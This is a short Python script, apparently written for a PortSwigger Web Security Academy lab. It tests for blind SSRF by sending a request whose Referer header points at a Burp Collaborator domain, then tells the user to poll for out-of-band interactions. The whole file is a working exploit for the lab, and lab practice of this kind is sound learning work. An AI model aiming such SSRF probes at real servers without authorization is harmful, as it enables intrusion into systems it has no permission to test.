# === Standard Library ===
import time

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install 'requests' with: pip install requests")

# === User Configuration ===
BASE_URL = "https://0ad3001c0335957e80d41c5e00100057.web-security-academy.net"
TARGET_PRODUCT = "/product?productId=1"  # or modify as needed
BURP_COLLAB_PAYLOAD = "xyzabc.oastify.com"  # 🔥 Insert your Burp Collaborator domain here
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

# === Exploit Function ===
def send_blind_ssrf():
    full_url = f"{BASE_URL}{TARGET_PRODUCT}"
    headers = {
        "Referer": f"http://{BURP_COLLAB_PAYLOAD}/tracking",
        "User-Agent": "Mozilla/5.0",
    }

    print(f"[*] Sending request with Referer => {headers['Referer']}")
    res = requests.get(full_url, headers=headers, proxies=PROXY if USE_PROXY else None)

    print(f"[+] Request sent. Status Code: {res.status_code}")
    print("[*] Now go to Burp Collaborator and click 'Poll now' to check for DNS/HTTP interactions.")

# === Main ===
if __name__ == "__main__":
    print("[*] Blind SSRF with OAST Detection Script Starting...")
    send_blind_ssrf()
